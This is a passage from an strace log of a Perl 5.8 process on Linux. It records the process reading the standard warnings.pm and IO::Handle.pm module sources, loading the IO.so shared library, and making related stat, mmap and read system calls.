\'reserved\'\t\t=> 74,\n    \'semicolon\'\t\t=> 76,\n    \'taint\'\t\t=> 78,\n    \'threads\'\t\t=> 80,\n    \'uninitialized\'\t=> 82,\n    \'unpack\'\t\t=> 84,\n    \'untie\'\t\t=> 86,\n    \'utf8\'\t\t=> 88,\n    \'void\'\t\t=> 90,\n    \'y2k\'\t\t=> 92,\n  );\n\nour %Bits = (\n    \'all\'\t\t=> \"\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x55\\x15\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\x54\\x55\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x54\\x05\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x40", 4096) = 4096
5970  07:11:35.421047 brk(0x81b6000)    = 0x81b6000
5970  07:11:35.421063 brk(0x81b5000)    = 0x81b5000
5970  07:11:35.421142 read(8, "\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x55\\x55\\x15\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x40\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x01\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x04\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x10\", # [46]\n  );\n\nour %DeadBits = (\n    \'all\'\t\t=> \"\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\xaa\\x2a\", # [0..46]\n    \'ambiguous\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\", # [29]\n    \'bareword\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\", # [30]\n    \'closed\'\t\t=> \"\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [6]\n    \'closure\'\t\t=> \"\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [1]\n    \'debugging\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\", # [22]\n    \'deprecated\'\t=> \"\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [2]\n    \'digit\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\", # [31]\n    \'exec\'\t\t=> \"\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [7]\n    \'exiting\'\t\t=> \"\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [3]\n    \'glob\'\t\t=> \"\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [4]\n    \'inplace\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\", # [23]\n    \'internal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\", # [24]\n    \'io\'\t\t=> \"\\x00\\xa8\\xaa\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [5..11]\n    \'layer\'\t\t=> \"\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [8]\n    \'malloc\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\", # [25]\n    \'misc\'\t\t=> \"\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [12]\n    \'newline\'\t\t=> \"\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [9]\n    \'numeric\'\t\t=> \"\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [13]\n    \'once\'\t\t=> \"\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [14]\n    \'overflow\'\t\t=> \"\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [15]\n    \'pack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [16]\n    \'parenthesis\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\", # [32]\n    \'pipe\'\t\t=> \"\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [10]\n    \'portable\'\t\t=> \"\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [17]\n    \'precedence\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\", # [33]\n    \'printf\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\", # [34]\n    \'prototype\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\", # [35]\n    \'qw\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\", # [36]\n    \'recursion\'\t\t=> \"\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [18]\n    \'redefine\'\t\t=> \"\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [19]\n    \'regexp\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x00\\x00\\x00\", # [20]\n    \'reserved\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\", # [37]\n    \'semicolon\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\", # [38]\n    \'severe\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\xa8\\x0a\\x00\\x00\\x00\\x00\\x00\", # [21..25]\n    \'signal\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x20\\x00\\x00\\x00\\x00\\x00\", # [26]\n    \'substr\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\", # [27]\n    \'syntax\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xaa\\xaa\\x2a\\x00\\x00\", # [28..38]\n    \'taint\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\\x00\", # [39]\n    \'threads\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\\x00\", # [40]\n    \'uninitialized\'\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\\x00\", # [41]\n    \'unopened\'\t\t=> \"\\x00\\x00\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\", # [11]\n    \'unpack\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\", 4096) = 4096
5970  07:11:35.421650 read(8, "x00\\x20\\x00\", # [42]\n    \'untie\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x80\\x00\", # [43]\n    \'utf8\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x02\", # [44]\n    \'void\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x08\", # [45]\n    \'y2k\'\t\t=> \"\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x20\", # [46]\n  );\n\n$NONE     = \"\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\\0\";\n$LAST_BIT = 94 ;\n$BYTES    = 12 ;\n\n$All = \"\" ; vec($All, $Offsets{\'all\'}, 2) = 3 ;\n\nsub Croaker\n{\n    local $Carp::CarpInternal{\'warnings\'};\n    delete $Carp::CarpInternal{\'warnings\'};\n    Carp::croak(@_);\n}\n\nsub bits\n{\n    # called from B::Deparse.pm\n\n    push @_, \'all\' unless @_;\n\n    my $mask;\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    return $mask ;\n}\n\nsub import \n{\n    shift;\n\n    my $catmask ;\n    my $fatal = 0 ;\n    my $no_fatal = 0 ;\n\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n    \n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    $fatal = 1;\n\t    $no_fatal = 0;\n\t}\n\telsif ($word eq \'NONFATAL\') {\n\t    $fatal = 0;\n\t    $no_fatal = 1;\n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask |= $catmask ;\n\t    $mask |= $DeadBits{$word} if $fatal ;\n\t    $mask &= ~($DeadBits{$word}|$All) if $no_fatal ;\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nsub unimport \n{\n    shift;\n\n    my $catmask ;\n    my $mask = ${^WARNING_BITS} ;\n\n    if (vec($mask, $Offsets{\'all\'}, 1)) {\n        $mask |= $Bits{\'all\'} ;\n        $mask |= $DeadBits{\'all\'} if vec($mask, $Offsets{\'all\'}+1, 1);\n    }\n\n    push @_, \'all\' unless @_;\n\n    foreach my $word ( @_ ) {\n\tif ($word eq \'FATAL\') {\n\t    next; \n\t}\n\telsif ($catmask = $Bits{$word}) {\n\t    $mask &= ~($catmask | $DeadBits{$word} | $All);\n\t}\n\telse\n          { Croaker(\"Unknown warnings category \'$word\'\")}\n    }\n\n    ${^WARNING_BITS} = $mask ;\n}\n\nmy %builtin_type; @builtin_type{qw(SCALAR ARRAY HASH CODE REF GLOB LVALUE Regexp)} = ();\n\nsub __chk\n{\n    my $category ;\n    my $offset ;\n    my $isobj = 0 ;\n\n    if (@_) {\n        # check the category supplied.\n        $category = shift ;\n        if (my $type = ref $category) {\n            Croaker(\"not an object\")\n                if exists $builtin_type{$type};\n\t    $category = $type;\n            $isobj = 1 ;\n        }\n        $offset = $Offsets{$category};\n        Croaker(\"Unknown warnings category \'$category\'\")\n\t    unless defined $offset;\n    }\n    else {\n        $category = (caller(1))[0] ;\n        $offset = $Offsets{$category};\n        Croaker(\"package \'$category\' not registered for warnings\")\n\t    unless defined $offset ;\n    }\n\n    my $this_pkg = (caller(1))[0] ;\n    my $i = 2 ;\n    my $pkg ;\n\n    if ($isobj) {\n        while (do { { package DB; $pkg = (caller($i++))[0] } } ) {\n            last unless @DB::args && $DB::args[0] =~ /^$category=/ ;\n        }\n\t$i -= 2 ;\n    }\n    else {\n        for ($i = 2 ; $pkg = (caller($i))[0] ; ++ $i) {\n            last if $pkg ne $this_pkg ;\n        }\n        $i = 2\n            if !$pkg || $pkg eq $this_pkg ;\n    }\n\n    my $callers_bitmask = (caller($i))[9] ;\n    return ($callers_bitmask, $offset, $i) ;\n}\n\nsub enabled\n{\n    Croaker(\"Usage: warnings::enabled([category])\")\n\tunless @_ == 1 || @_ == 0 ;\n\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return 0 unless defined $callers_bitmask ;\n    return vec($callers_bitmask, $offset, 1) ||\n           vec($callers_bitmask, $Offsets{\'all\'}, 1) ;\n}\n\nsub warn\n{\n    Croaker(\"Usage: warnings::warn([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $me", 4096) = 4096
5970  07:11:35.422493 read(8, "ssage = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n    Carp::carp($message) ;\n}\n\nsub warnif\n{\n    Croaker(\"Usage: warnings::warnif([category,] \'message\')\")\n\tunless @_ == 2 || @_ == 1 ;\n\n    my $message = pop ;\n    my ($callers_bitmask, $offset, $i) = __chk(@_) ;\n\n    return\n        unless defined $callers_bitmask &&\n            \t(vec($callers_bitmask, $offset, 1) ||\n            \tvec($callers_bitmask, $Offsets{\'all\'}, 1)) ;\n\n    Carp::croak($message)\n\tif vec($callers_bitmask, $offset+1, 1) ||\n\t   vec($callers_bitmask, $Offsets{\'all\'}+1, 1) ;\n\n    Carp::carp($message) ;\n}\n\n1;\n# ex: set ro:\n", 4096) = 730
5970  07:11:35.422656 read(8, "", 4096) = 0
5970  07:11:35.422669 close(8)          = 0
5970  07:11:35.422818 _llseek(6, 412, [412], SEEK_SET) = 0
5970  07:11:35.422833 _llseek(6, 0, [412], SEEK_CUR) = 0
5970  07:11:35.422844 close(6)          = 0
5970  07:11:35.422889 stat64("/usr/lib/perl/5.8/auto/IO/IO.so", {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5970  07:11:35.422912 stat64("/usr/lib/perl/5.8/auto/IO/IO.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5970  07:11:35.422981 futex(0xb7ef7070, 0x81 /* FUTEX_??? */, 2147483647) = 0
5970  07:11:35.423031 open("/usr/lib/perl/5.8/auto/IO/IO.so", O_RDONLY) = 6
5970  07:11:35.423045 read(6, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0000\22\0\0004\0\0\0\0349\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\2006\0\0\2006\0\0\5\0\0\0\0\20\0\0\1\0\0\0\2006\0\0\200F\0\0\200F\0\0\360\1\0\0\364\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\2246\0\0\224F\0\0\224F\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0C\0\0\0E\0\0\0\0\0\0\0\t\0\0\0\3\0\0\0D\0\0\0\"\0\0\0009\0\0\0\0\0\0\0#\0\0\0\0\0\0\0%\0\0\0:\0\0\0\4\0\0\0001\0\0\0\37\0\0\0;\0\0\0\30\0\0\0+\0\0\0\23\0\0\0\n\0\0\0000\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\16\0\0\0\0\0\0\0004\0\0\0\0\0\0\0\0\0\0\0008\0\0\0\32\0\0\0\0\0\0\0\0\0\0\0?\0\0\0)\0\0\0\10\0\0\0.\0\0\0\26\0\0\0!\0\0\0\21\0\0\0(\0\0\0&\0\0\0-\0\0\0\0\0\0\0\0\0\0\0/\0\0\0\0\0\0\0\0\0\0\0$\0\0\0006\0\0\0\24\0\0\0A\0\0\0\0\0\0\0\27\0\0\0@\0\0\0\0\0\0\0\5\0\0\0\0\0\0\0\0\0\0\0\33\0\0\0\17\0\0\0002\0\0\0\22\0\0\0>\0\0\0\'\0\0\0\36\0\0\0*\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0007\0\0\0\0\0\0\0\7\0\0\0\0\0\0\0\0\0\0\0", 512) = 512
5970  07:11:35.423131 fstat64(6, {st_mode=S_IFREG|0644, st_size=15580, ...}) = 0
5970  07:11:35.423157 mmap2(NULL, 18548, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 6, 0) = 0xb7efb000
5970  07:11:35.423174 mmap2(0xb7eff000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 6, 0x3) = 0xb7eff000
5970  07:11:35.423188 close(6)          = 0
5970  07:11:35.423315 stat64("/etc/perl/IO/Handle.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423331 stat64("/etc/perl/IO/Handle.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423345 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423357 stat64("/usr/local/lib/perl/5.8.8/IO/Handle.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423371 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423384 stat64("/usr/local/share/perl/5.8.8/IO/Handle.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423398 stat64("/usr/lib/perl5/IO/Handle.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423409 stat64("/usr/lib/perl5/IO/Handle.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423435 stat64("/usr/share/perl5/IO/Handle.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423449 stat64("/usr/share/perl5/IO/Handle.pm", 0xbf8ebd4c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423493 stat64("/usr/lib/perl/5.8/IO/Handle.pmc", 0xbf8ebe3c) = -1 ENOENT (No such file or directory)
5970  07:11:35.423524 stat64("/usr/lib/perl/5.8/IO/Handle.pm", {st_mode=S_IFREG|0644, st_size=7592, ...}) = 0
5970  07:11:35.423558 open("/usr/lib/perl/5.8/IO/Handle.pm", O_RDONLY|O_LARGEFILE) = 6
5970  07:11:35.423573 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbf8ebb58) = -1 ENOTTY (Inappropriate ioctl for device)
5970  07:11:35.423584 _llseek(6, 0, [0], SEEK_CUR) = 0
5970  07:11:35.423601 read(6, "package IO::Handle;\n\nuse 5.006_001;\nuse strict;\nour($VERSION, @EXPORT_OK, @ISA);\nuse Carp;\nuse Symbol;\nuse SelectSaver;\nuse IO ();\t# Load the XS module\n\nrequire Exporter;\n@ISA = qw(Exporter);\n\n$VERSION = \"1.25\";\n$VERSION = eval $VERSION;\n\n@EXPORT_OK = qw(\n    autoflush\n    output_field_separator\n    output_record_separator\n    input_record_separator\n    input_line_number\n    format_page_number\n    format_lines_per_page\n    format_lines_left\n    format_name\n    format_top_name\n    format_line_break_characters\n    format_formfeed\n    format_write\n\n    print\n    printf\n    getline\n    getlines\n\n    printflush\n    flush\n\n    SEEK_SET\n    SEEK_CUR\n    SEEK_END\n    _IOFBF\n    _IOLBF\n    _IONBF\n);\n\n################################################\n## Constructors, destructors.\n##\n\nsub new {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 1 or croak \"usage: new $class\";\n    my $io = gensym;\n    bless $io, $class;\n}\n\nsub new_from_fd {\n    my $class = ref($_[0]) || $_[0] || \"IO::Handle\";\n    @_ == 3 or croak \"usage: new_from_fd $class FD, MODE\";\n    my $io = gensym;\n    shift;\n    IO::Handle::fdopen($io, @_)\n\tor return undef;\n    bless $io, $class;\n}\n\n#\n# There is no need for DESTROY to do anything, because when the\n# last reference to an IO object is gone, Perl automatically\n# closes its associated files (if any).  However, to avoid any\n# attempts to autoload DESTROY, we here define it to do nothing.\n#\nsub DESTROY {}\n\n################################################\n## Open and close.\n##\n\nsub _open_mode_string {\n    my ($mode) = @_;\n    $mode =~ /^\\+?(<|>>?)$/\n      or $mode =~ s/^r(\\+?)$/$1</\n      or $mode =~ s/^w(\\+?)$/$1>/\n      or $mode =~ s/^a(\\+?)$/$1>>/\n      or croak \"IO::Handle: bad open mode: $mode\";\n    $mode;\n}\n\nsub fdopen {\n    @_ == 3 or croak \'usage: $io->fdopen(FD, MODE)\';\n    my ($io, $fd, $mode) = @_;\n    local(*GLOB);\n\n    if (ref($fd) && \"\".$fd =~ /GLOB\\(/o) {\n\t# It\'s a glob reference; Alias it as we cannot get name of anon GLOBs\n\tmy $n = qualify(*GLOB);\n\t*GLOB = *{*$fd};\n\t$fd =  $n;\n    } elsif ($fd =~ m#^\\d+$#) {\n\t# It\'s an FD number; prefix with \"=\".\n\t$fd = \"=$fd\";\n    }\n\n    open($io, _open_mode_string($mode) . \'&\' . $fd)\n\t? $io : undef;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $io->close()\';\n    my($io) = @_;\n\n    close($io);\n}\n\n################################################\n## Normal I/O functions.\n##\n\n# flock\n# select\n\nsub opened {\n    @_ == 1 or croak \'usage: $io->opened()\';\n    defined fileno($_[0]);\n}\n\nsub fileno {\n    @_ == 1 or croak \'usage: $io->fileno()\';\n    fileno($_[0]);\n}\n\nsub getc {\n    @_ == 1 or croak \'usage: $io->getc()\';\n    getc($_[0]);\n}\n\nsub eof {\n    @_ == 1 or croak \'usage: $io->eof()\';\n    eof($_[0]);\n}\n\nsub print {\n    @_ or croak \'usage: $io->print(ARGS)\';\n    my $this = shift;\n    print $this @_;\n}\n\nsub printf {\n    @_ >= 2 or croak \'usage: $io->printf(FMT,[ARGS])\';\n    my $this = shift;\n    printf $this @_;\n}\n\nsub getline {\n    @_ == 1 or croak \'usage: $io->getline()\';\n    my $this = shift;\n    return scalar <$this>;\n} \n\n*gets = \\&getline;  # deprecated\n\nsub getlines {\n    @_ == 1 or croak \'usage: $io->getlines()\';\n    wantarray or\n\tcroak \'Can\\\'t call $io->getlines in a scalar context, use $io->getline\';\n    my $this = shift;\n    return <$this>;\n}\n\nsub truncate {\n    @_ == 2 or croak \'usage: $io->truncate(LEN)\';\n    truncate($_[0], $_[1]);\n}\n\nsub read {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->read(BUF, LEN [, OFFSET])\';\n    read($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub sysread {\n    @_ == 3 || @_ == 4 or croak \'usage: $io->sysread(BUF, LEN [, OFFSET])\';\n    sysread($_[0], $_[1], $_[2], $_[3] || 0);\n}\n\nsub write {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->write(BUF [, LEN [, OFFSET]])\';\n    local($\\) = \"\";\n    $_[2] = length($_[1]) unless defined $_[2];\n    print { $_[0] } substr($_[1], $_[3] || 0, $_[2]);\n}\n\nsub syswrite {\n    @_ >= 2 && @_ <= 4 or croak \'usage: $io->syswrite(BUF [, LEN [, OFFSET]])\';\n    if (defined($_[2])) {\n\tsyswrite($_[0], $_[1], $_[2], $_[3] || 0);\n    } else {\n\tsyswrite($_[0], $_[1]);\n    }\n}\n\nsub stat {\n    @_ == 1 or croak \'u", 4096) = 4096
5970  07:11:35.423986 stat64("/etc/perl/Symbol.pmc",  <unfinished ...>
